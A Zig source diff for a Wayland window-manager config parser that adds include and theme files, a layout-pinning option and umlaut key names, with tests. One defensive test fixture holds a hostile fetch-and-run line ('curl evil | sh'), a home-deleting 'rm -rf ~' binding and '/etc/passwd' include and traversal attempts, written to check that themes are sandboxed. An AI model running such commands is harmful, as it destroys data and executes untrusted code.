@@ -18,6 +18,21 @@
 // Key names are resolved through xkbcommon, so they are layout-correct.
 // River matches bindings against the *active* layout; no manual QWERTZ /
 // AZERTY remapping is needed (the old layoutMapKeysym() was wrong).
+//
+// A key can be named by its keysym (`Return`, `udiaeresis`, `U00FC`) or, for
+// a single character, by that character itself (`Super+ü`, `Super+ß`) --
+// handy on a German layout, where the key labelled ü has no ASCII name.
+//
+// `include = FILE` reads another file at that point (so later lines override
+// it); `theme = NAME` includes Themes/NAME.conf, restricted to the look
+// options (colours, border width, gaps) so a theme can never bind a key or
+// start a program. See `Includer`.
+//
+// By default a binding is translated with whichever layout is active at the
+// moment. `bind_layout = 0` (or 1, 2, 3) pins all bindings to that layout of
+// the keyboard instead, so a binding written as `Super+q` keeps working
+// after switching from `us` to `de` and back (river_xkb_binding_v1.
+// set_layout_override).
 
 const std = @import("std");
 const wayland = @import("wayland");
@@ -64,6 +79,9 @@ pub const max_font_len = 63;
 
 /// Hard upper bound; Output holds workspaces in a fixed array.
 pub const max_workspaces = 16;
+
+/// xkbcommon allows at most four layouts per keymap.
+pub const max_bind_layouts = 4;
 
 pub const Config = struct {
     arena: std.heap.ArenaAllocator,
@@ -142,6 +160,16 @@ pub const Config = struct {
     /// allows it. Neither needs to exist; a missing script is a no-op.
     enable_autostart: bool = true,
 
+    /// Lines the parser had to skip (unknown key, bad value, missing include,
+    /// a theme using an option themes may not use). The shipped files are
+    /// tested to have none.
+    parse_warnings: u32 = 0,
+
+    // ---- keyboard -------------------------------------------------------------
+    /// null: bindings follow the active xkb layout. N: always translate key
+    /// events with layout N (0-based) of the keyboard that produced them.
+    bind_layout: ?u32 = null,
+
     // ---- Dock and Clip (see dock.zig) -------------------------------------------
     /// Draw the Dock: a column of 64 px tiles on one screen edge. Its first
     /// tile is the Window Maker logo tile, the others are the DockApps of
@@ -193,11 +221,18 @@ pub fn load(io: std.Io, gpa: std.mem.Allocator) !Config {
 
     var binds: std.ArrayList(Bind) = .empty;
     try parse(a, default_config_text, &cfg, &binds, "<built-in>");
+    cfg.parse_warnings = 0; // the built-in file is tested; only the user's count
 
     if (try userConfigPath(a)) |path| {
         if (std.Io.Dir.readFileAlloc(std.Io.Dir.cwd(), io, path, a, .limited(1 << 20))) |text| {
             cfg.config_file = path;
-            try parse(a, text, &cfg, &binds, path);
+            var reader: FileReader = .{ .io = io };
+            const inc: Includer = .{
+                .ctx = &reader,
+                .read = FileReader.read,
+                .dir = std.fs.path.dirname(path) orelse ".",
+            };
+            try parseWith(a, text, &cfg, &binds, path, &inc, false);
         } else |err| {
             std.log.info("no user config at {s} ({t}); using defaults", .{ path, err });
         }
@@ -222,6 +257,50 @@ fn userConfigPath(a: std.mem.Allocator) !?[]const u8 {
 // Parsing
 // ----------------------------------------------------------------------------
 
+/// Reads the files `include`/`theme` name. A callback so that parsing stays
+/// free of file-system access (and testable with a map of fake files).
+pub const Includer = struct {
+    ctx: *anyopaque,
+    /// The contents of `path` (allocated in `a`), or null if it cannot be
+    /// read.
+    read: *const fn (ctx: *anyopaque, a: std.mem.Allocator, path: []const u8) ?[]const u8,
+    /// Directory of the file being parsed: relative includes and Themes/
+    /// are looked up from here.
+    dir: []const u8,
+    depth: u8 = 0,
+};
+
+pub const max_include_depth = 4;
+
+/// Where a theme is looked for besides next to the config.
+const theme_dirs = [_][]const u8{ "/usr/local/share/wmaker-wl/Themes", "/usr/share/wmaker-wl/Themes" };
+
+/// The options a theme may set: how things look, nothing that does anything.
+fn themeKey(key: []const u8) bool {
+    inline for (.{ "gap", "outer_gap", "border_width", "border_focused", "border_unfocused", "border_floating" }) |k| {
+        if (std.mem.eql(u8, key, k)) return true;
+    }
+    return false;
+}
+
+const FileReader = struct {
+    io: std.Io,
+
+    fn read(ctx: *anyopaque, a: std.mem.Allocator, path: []const u8) ?[]const u8 {
+        const self: *FileReader = @ptrCast(@alignCast(ctx));
+        return std.Io.Dir.readFileAlloc(std.Io.Dir.cwd(), self.io, path, a, .limited(1 << 20)) catch null;
+    }
+};
+
+/// A theme name is a file name: letters, digits, `_`, `-`, `.`; never a path.
+pub fn validThemeName(name: []const u8) bool {
+    if (name.len == 0 or name.len > 64 or name[0] == '.') return false;
+    for (name) |ch| {
+        if (!std.ascii.isAlphanumeric(ch) and ch != '_' and ch != '-' and ch != '.') return false;
+    }
+    return std.mem.indexOf(u8, name, "..") == null;
+}
+
 pub fn parse(
     a: std.mem.Allocator,
     text: []const u8,
@@ -229,6 +308,20 @@ pub fn parse(
     binds: *std.ArrayList(Bind),
     origin: []const u8,
 ) !void {
+    return parseWith(a, text, cfg, binds, origin, null, false);
+}
+
+/// `inc` null: `include`/`theme` are refused (a warning). `theme_only`: the
+/// text comes from a theme, so only look options are accepted.
+pub fn parseWith(
+    a: std.mem.Allocator,
+    text: []const u8,
+    cfg: *Config,
+    binds: *std.ArrayList(Bind),
+    origin: []const u8,
+    inc: ?*const Includer,
+    theme_only: bool,
+) std.mem.Allocator.Error!void {
     var line_no: usize = 0;
     var lines = std.mem.splitScalar(u8, text, '\n');
     while (lines.next()) |raw| {
@@ -238,17 +331,117 @@ pub fn parse(
 
         const eq = std.mem.indexOfScalar(u8, line, '=') orelse {
             std.log.warn("{s}:{d}: expected `key = value`", .{ origin, line_no });
+            cfg.parse_warnings += 1;
             continue;
         };
         const key = std.mem.trim(u8, line[0..eq], " \t");
         const value = std.mem.trim(u8, line[eq + 1 ..], " \t\"");
 
+        const is_include = std.mem.eql(u8, key, "include");
+        const is_theme = std.mem.eql(u8, key, "theme");
+        if (is_include or is_theme) {
+            if (theme_only) {
+                std.log.warn("{s}:{d}: a theme cannot include anything", .{ origin, line_no });
+                cfg.parse_warnings += 1;
+            } else {
+                try includeFile(a, cfg, binds, inc, value, is_theme, origin, line_no);
+            }
+            continue;
+        }
+        if (theme_only and !themeKey(key)) {
+            std.log.warn("{s}:{d}: `{s}` is not a theme option (themes set colours, borders and gaps only)", .{ origin, line_no, key });
+            cfg.parse_warnings += 1;
+            continue;
+        }
+
         applyOption(a, cfg, binds, key, value) catch |err| switch (err) {
             error.OutOfMemory => return error.OutOfMemory,
-            error.UnknownKey => std.log.warn("{s}:{d}: unknown option `{s}`", .{ origin, line_no, key }),
-            error.Invalid => std.log.warn("{s}:{d}: bad value for `{s}`: {s}", .{ origin, line_no, key, value }),
+            error.UnknownKey => {
+                std.log.warn("{s}:{d}: unknown option `{s}`", .{ origin, line_no, key });
+                cfg.parse_warnings += 1;
+            },
+            error.Invalid => {
+                std.log.warn("{s}:{d}: bad value for `{s}`: {s}", .{ origin, line_no, key, value });
+                cfg.parse_warnings += 1;
+            },
         };
     }
+}
+
+fn includeFile(
+    a: std.mem.Allocator,
+    cfg: *Config,
+    binds: *std.ArrayList(Bind),
+    inc: ?*const Includer,
+    value: []const u8,
+    is_theme: bool,
+    origin: []const u8,
+    line_no: usize,
+) std.mem.Allocator.Error!void {
+    const what: []const u8 = if (is_theme) "theme" else "include";
+    const i = inc orelse {
+        std.log.warn("{s}:{d}: `{s}` is not available here", .{ origin, line_no, what });
+        cfg.parse_warnings += 1;
+        return;
+    };
+    if (i.depth >= max_include_depth) {
+        std.log.warn("{s}:{d}: `{s}` nested too deep (limit {d})", .{ origin, line_no, what, max_include_depth });
+        cfg.parse_warnings += 1;
+        return;
+    }
+    if (value.len == 0) {
+        std.log.warn("{s}:{d}: `{s}` needs a value", .{ origin, line_no, what });
+        cfg.parse_warnings += 1;
+        return;
+    }
+
+    var found_path: ?[]const u8 = null;
+    var text: ?[]const u8 = null;
+
+    if (is_theme) {
+        if (!validThemeName(value)) {
+            std.log.warn("{s}:{d}: `{s}` is not a theme name", .{ origin, line_no, value });
+            cfg.parse_warnings += 1;
+            return;
+        }
+        const first = try std.fmt.allocPrint(a, "{s}/Themes/{s}.conf", .{ i.dir, value });
+        if (i.read(i.ctx, a, first)) |t| {
+            found_path = first;
+            text = t;
+        } else for (theme_dirs) |d| {
+            const p = try std.fmt.allocPrint(a, "{s}/{s}.conf", .{ d, value });
+            if (i.read(i.ctx, a, p)) |t| {
+                found_path = p;
+                text = t;
+                break;
+            }
+        }
+    } else {
+        const p = if (std.mem.startsWith(u8, value, "~/")) blk: {
+            const home = std.c.getenv("HOME") orelse break :blk value;
+            break :blk try std.fmt.allocPrint(a, "{s}{s}", .{ std.mem.span(home), value[1..] });
+        } else if (std.fs.path.isAbsolute(value))
+            value
+        else
+            try std.fmt.allocPrint(a, "{s}/{s}", .{ i.dir, value });
+        if (i.read(i.ctx, a, p)) |t| {
+            found_path = p;
+            text = t;
+        }
+    }
+
+    const path = found_path orelse {
+        std.log.warn("{s}:{d}: cannot read {s} `{s}`", .{ origin, line_no, what, value });
+        cfg.parse_warnings += 1;
+        return;
+    };
+    var child: Includer = .{
+        .ctx = i.ctx,
+        .read = i.read,
+        .dir = std.fs.path.dirname(path) orelse ".",
+        .depth = i.depth + 1,
+    };
+    try parseWith(a, text.?, cfg, binds, path, &child, is_theme);
 }
 
 /// Remove a trailing comment.
@@ -336,18 +529,7 @@ fn applyOption(
         }
     }
 
-    inline for (.{ "font_menu_title", "font_menu", "font_dock" }) |name| {
-        if (eql(u8, key, name)) {
-            @field(cfg, name) = try parseFont(a, value);
-            return;
-        }
-    }
-
-    inline for (.{
-        "dock_enabled",           "dock_on_top",    "dock_reserve_space", "clip_enabled",
-        "clip_on_top",            "clip_collapsed", "focus_new_windows",  "workspace_wrap",
-        "clip_scroll_workspaces",
-    }) |name| {
+    inline for (.{ "dock_enabled", "dock_on_top", "dock_reserve_space", "clip_enabled", "clip_on_top", "clip_collapsed" }) |name| {
         if (eql(u8, key, name)) {
             @field(cfg, name) = try parseBool(value);
             return;
@@ -380,6 +562,14 @@ fn applyOption(
         cfg.enable_autostart = try parseBool(value);
     } else if (eql(u8, key, "enable_dockapps")) {
         cfg.enable_dockapps = try parseBool(value);
+    } else if (eql(u8, key, "bind_layout")) {
+        if (eql(u8, value, "current") or eql(u8, value, "active")) {
+            cfg.bind_layout = null;
+        } else {
+            const n = std.fmt.parseInt(u32, value, 10) catch return error.Invalid;
+            if (n >= max_bind_layouts) return error.Invalid;
+            cfg.bind_layout = n;
+        }
     } else if (eql(u8, key, "dock_edge")) {
         cfg.dock_edge = std.meta.stringToEnum(DockEdge, value) orelse return error.Invalid;
     } else if (eql(u8, key, "clip_corner")) {
@@ -553,8 +743,24 @@ fn parseCombo(a: std.mem.Allocator, s: []const u8) ?Combo {
     const z = a.dupeZ(u8, key_name) catch return null;
     var sym = xkb.Keysym.fromName(z, .no_flags);
     if (sym == .NoSymbol) sym = xkb.Keysym.fromName(z, .case_insensitive);
-    if (sym == .NoSymbol) return null;
+    if (sym == .NoSymbol) {
+        // One character, written as itself: ü, ß, ä, é ...
+        const cp = singleCodepoint(key_name) orelse return null;
+        const ks = xkb_utf32_to_keysym(cp);
+        if (ks == 0) return null; // XKB_KEY_NoSymbol
+        return .{ .mods = mods, .keysym = ks };
+    }
     return .{ .mods = mods, .keysym = @intFromEnum(sym) };
+}
+
+extern fn xkb_utf32_to_keysym(ucs: u32) u32;
+
+/// The code point of `s` if it is exactly one UTF-8 encoded character.
+fn singleCodepoint(s: []const u8) ?u21 {
+    if (s.len == 0) return null;
+    const n = std.unicode.utf8ByteSequenceLength(s[0]) catch return null;
+    if (n != s.len) return null;
+    return std.unicode.utf8Decode(s) catch null;
 }
 
 test "colour detection" {
@@ -648,4 +854,221 @@ test "the built-in default config has the documented Dock and Clip defaults" {
     try std.testing.expect(cfg.clip_on_top);
     try std.testing.expect(!cfg.clip_collapsed);
     try std.testing.expectEqual(@as(usize, 0), cfg.workspace_names.len);
+}
+
+test "bind_layout: current, a layout number, and nonsense" {
+    var arena: std.heap.ArenaAllocator = .init(std.testing.allocator);
+    defer arena.deinit();
+    var cfg: Config = .{ .arena = .init(std.testing.allocator) };
+    defer cfg.deinit();
+    var binds: std.ArrayList(Bind) = .empty;
+
+    try std.testing.expectEqual(@as(?u32, null), cfg.bind_layout);
+    try parse(arena.allocator(), "bind_layout = 1\n", &cfg, &binds, "<test>");
+    try std.testing.expectEqual(@as(?u32, 1), cfg.bind_layout);
+    try parse(arena.allocator(), "bind_layout = current\n", &cfg, &binds, "<test>");
+    try std.testing.expectEqual(@as(?u32, null), cfg.bind_layout);
+    try parse(arena.allocator(), "bind_layout = 0\nbind_layout = 9\nbind_layout = -1\nbind_layout = de\n", &cfg, &binds, "<test>");
+    // 9, -1 and "de" are rejected: the 0 stays.
+    try std.testing.expectEqual(@as(?u32, 0), cfg.bind_layout);
+}
+
+test "keys can be named by the character itself (German umlauts, sharp s)" {
+    var arena: std.heap.ArenaAllocator = .init(std.testing.allocator);
+    defer arena.deinit();
+    const a = arena.allocator();
+
+    const ue = parseCombo(a, "Super+ü").?;
+    const by_name = parseCombo(a, "Super+udiaeresis").?;
+    try std.testing.expectEqual(by_name.keysym, ue.keysym);
+    try std.testing.expect(ue.mods.mod4);
+
+    try std.testing.expect(parseCombo(a, "ss") == null); // not a keysym, and not one character
+    try std.testing.expectEqual(parseCombo(a, "ssharp").?.keysym, parseCombo(a, "ß").?.keysym);
+    try std.testing.expectEqual(parseCombo(a, "adiaeresis").?.keysym, parseCombo(a, "Alt+ä").?.keysym);
+    // Plain ASCII still goes through the name lookup.
+    try std.testing.expectEqual(parseCombo(a, "q").?.keysym, parseCombo(a, "Super+q").?.keysym);
+
+    // Not a key: several characters, or nothing sensible.
+    try std.testing.expect(parseCombo(a, "Super+üü") == null);
+    try std.testing.expect(parseCombo(a, "Super+") == null);
+}
+
+test "a bind line with an umlaut key is accepted" {
+    var arena: std.heap.ArenaAllocator = .init(std.testing.allocator);
+    defer arena.deinit();
+    var cfg: Config = .{ .arena = .init(std.testing.allocator) };
+    defer cfg.deinit();
+    var binds: std.ArrayList(Bind) = .empty;
+    try parse(arena.allocator(), "bind = Super+ö, close\nbind = Super+Shift+Ü, exit\n", &cfg, &binds, "<test>");
+    try std.testing.expectEqual(@as(usize, 2), binds.items.len);
+}
+
+// ----------------------------------------------------------------------------
+// include / theme
+// ----------------------------------------------------------------------------
+
+/// An in-memory file system for the tests: path -> contents.
+const FakeFiles = struct {
+    paths: []const []const u8,
+    texts: []const []const u8,
+    reads: usize = 0,
+
+    fn read(ctx: *anyopaque, a: std.mem.Allocator, path: []const u8) ?[]const u8 {
+        const self: *FakeFiles = @ptrCast(@alignCast(ctx));
+        self.reads += 1;
+        for (self.paths, 0..) |p, i| {
+            if (std.mem.eql(u8, p, path)) return a.dupe(u8, self.texts[i]) catch null;
+        }
+        return null;
+    }
+
+    fn includer(self: *FakeFiles, dir: []const u8) Includer {
+        return .{ .ctx = self, .read = read, .dir = dir };
+    }
+};
+
+fn parseFake(files: *FakeFiles, main_text: []const u8, cfg: *Config) !void {
+    var arena: std.heap.ArenaAllocator = .init(std.testing.allocator);
+    defer arena.deinit();
+    var binds: std.ArrayList(Bind) = .empty;
+    const inc = files.includer("/cfg");
+    try parseWith(cfg.arena.allocator(), main_text, cfg, &binds, "/cfg/config.conf", &inc, false);
+    cfg.binds = try binds.toOwnedSlice(cfg.arena.allocator());
+}
+
+test "include reads another file in place: later lines override it, earlier ones are overridden" {
+    var cfg: Config = .{ .arena = .init(std.testing.allocator) };
+    defer cfg.deinit();
+    var files: FakeFiles = .{
+        .paths = &.{ "/cfg/look.conf", "/abs/other.conf" },
+        .texts = &.{ "gap = 20\nouter_gap = 21\nbind = Super+x, close\n", "border_width = 6\n" },
+    };
+    try parseFake(&files, "gap = 1\ninclude = look.conf\nouter_gap = 5\ninclude = /abs/other.conf\n", &cfg);
+    try std.testing.expectEqual(@as(i32, 20), cfg.gap); // the include came after `gap = 1`
+    try std.testing.expectEqual(@as(i32, 5), cfg.outer_gap); // the main file came after the include
+    try std.testing.expectEqual(@as(i32, 6), cfg.border_width);
+    try std.testing.expectEqual(@as(usize, 1), cfg.binds.len); // an include may bind keys: it is the user's own
+    try std.testing.expectEqual(@as(u32, 0), cfg.parse_warnings);
+}
+
+test "include problems are warnings, never failures: missing, empty, too deep" {
+    var cfg: Config = .{ .arena = .init(std.testing.allocator) };
+    defer cfg.deinit();
+    var files: FakeFiles = .{
+        .paths = &.{"/cfg/self.conf"},
+        .texts = &.{"include = self.conf\ngap = 3\n"},
+    };
+    try parseFake(&files, "include = nope.conf\ninclude =\ninclude = self.conf\nborder_width = 4\n", &cfg);
+    // The main file kept going, and the self-including file stopped at the limit.
+    try std.testing.expectEqual(@as(i32, 4), cfg.border_width);
+    try std.testing.expectEqual(@as(i32, 3), cfg.gap);
+    try std.testing.expect(cfg.parse_warnings >= 3);
+    // Bounded: not an endless read loop.
+    try std.testing.expect(files.reads <= max_include_depth + 2);
+}
+
+test "without an Includer, include and theme are refused" {
+    var arena: std.heap.ArenaAllocator = .init(std.testing.allocator);
+    defer arena.deinit();
+    var cfg: Config = .{ .arena = .init(std.testing.allocator) };
+    defer cfg.deinit();
+    var binds: std.ArrayList(Bind) = .empty;
+    try parse(arena.allocator(), "include = x.conf\ntheme = nord\ngap = 9\n", &cfg, &binds, "<t>");
+    try std.testing.expectEqual(@as(i32, 9), cfg.gap);
+    try std.testing.expectEqual(@as(u32, 2), cfg.parse_warnings);
+}
+
+test "a theme sets look options; anything else in it is ignored" {
+    var cfg: Config = .{ .arena = .init(std.testing.allocator) };
+    defer cfg.deinit();
+    var files: FakeFiles = .{
+        .paths = &.{"/cfg/Themes/evil.conf"},
+        .texts = &.{
+            \\border_focused = #112233
+            \\gap = 2
+            \\terminal = sh -c "curl evil | sh"
+            \\bind = Super+Return, shell rm -rf ~
+            \\include = /etc/passwd
+            \\theme = other
+            \\workspace_count = 9
+        },
+    };
+    try parseFake(&files, "terminal = foot\ntheme = evil\n", &cfg);
+    try std.testing.expectEqual(@as(u32, 0x112233), cfg.border_focused);
+    try std.testing.expectEqual(@as(i32, 2), cfg.gap);
+    // None of the dangerous lines did anything.
+    try std.testing.expectEqualStrings("foot", cfg.terminal[0]);
+    try std.testing.expectEqual(@as(usize, 0), cfg.binds.len);
+    try std.testing.expectEqual(@as(u32, 4), cfg.workspace_count);
+    try std.testing.expectEqual(@as(u32, 5), cfg.parse_warnings);
+}
+
+test "theme names are file names, never paths" {
+    try std.testing.expect(validThemeName("nord"));
+    try std.testing.expect(validThemeName("my-theme_2.v1"));
+    try std.testing.expect(!validThemeName(""));
+    try std.testing.expect(!validThemeName("../etc/passwd"));
+    try std.testing.expect(!validThemeName("a/b"));
+    try std.testing.expect(!validThemeName(".hidden"));
+    try std.testing.expect(!validThemeName("a..b"));
+    try std.testing.expect(!validThemeName("with space"));
+    try std.testing.expect(!validThemeName("x" ** 65));
+
+    var cfg: Config = .{ .arena = .init(std.testing.allocator) };
+    defer cfg.deinit();
+    var files: FakeFiles = .{ .paths = &.{"/etc/passwd.conf"}, .texts = &.{"gap = 99\n"} };
+    try parseFake(&files, "theme = ../../etc/passwd\n", &cfg);
+    try std.testing.expectEqual(@as(i32, 8), cfg.gap);
+    try std.testing.expectEqual(@as(u32, 1), cfg.parse_warnings);
+    try std.testing.expectEqual(@as(usize, 0), files.reads); // refused before any read
+}
+
+test "a missing theme is a warning and the defaults stay" {
+    var cfg: Config = .{ .arena = .init(std.testing.allocator) };
+    defer cfg.deinit();
+    var files: FakeFiles = .{ .paths = &.{}, .texts = &.{} };
+    try parseFake(&files, "theme = nonexistent\n", &cfg);
+    try std.testing.expectEqual(@as(i32, 8), cfg.gap);
+    try std.testing.expectEqual(@as(u32, 1), cfg.parse_warnings);
+}
+
+test "the shipped themes are valid themes and the shipped config has no warnings" {
+    const themes = [_]struct { name: []const u8, text: []const u8 }{
+        .{ .name = "gruvbox", .text = @embedFile("share/Themes/gruvbox.conf") },
+        .{ .name = "nord", .text = @embedFile("share/Themes/nord.conf") },
+        .{ .name = "next", .text = @embedFile("share/Themes/next.conf") },
+    };
+    for (themes) |t| {
+        var arena: std.heap.ArenaAllocator = .init(std.testing.allocator);
+        defer arena.deinit();
+        var cfg: Config = .{ .arena = .init(std.testing.allocator) };
+        defer cfg.deinit();
+        var binds: std.ArrayList(Bind) = .empty;
+        try parseWith(arena.allocator(), t.text, &cfg, &binds, t.name, null, true);
+        try std.testing.expectEqual(@as(u32, 0), cfg.parse_warnings);
+        try std.testing.expect(cfg.border_width >= 1);
+    }
+
+    // gruvbox is the built-in look: it must equal the defaults, or the
+    // "built-in" claim in its header is a lie.
+    var def: Config = .{ .arena = .init(std.testing.allocator) };
+    defer def.deinit();
+    var gb: Config = .{ .arena = .init(std.testing.allocator) };
+    defer gb.deinit();
+    var arena: std.heap.ArenaAllocator = .init(std.testing.allocator);
+    defer arena.deinit();
+    var b1: std.ArrayList(Bind) = .empty;
+    try parse(arena.allocator(), default_config_text, &def, &b1, "<built-in>");
+    var b2: std.ArrayList(Bind) = .empty;
+    try parseWith(arena.allocator(), themes[0].text, &gb, &b2, "gruvbox", null, true);
+    try std.testing.expectEqual(def.border_focused, gb.border_focused);
+    try std.testing.expectEqual(def.border_unfocused, gb.border_unfocused);
+    try std.testing.expectEqual(def.border_floating, gb.border_floating);
+    try std.testing.expectEqual(def.border_width, gb.border_width);
+    try std.testing.expectEqual(def.gap, gb.gap);
+    try std.testing.expectEqual(def.outer_gap, gb.outer_gap);
+
+    // The built-in default config parses without a single warning.
+    try std.testing.expectEqual(@as(u32, 0), def.parse_warnings);
 }
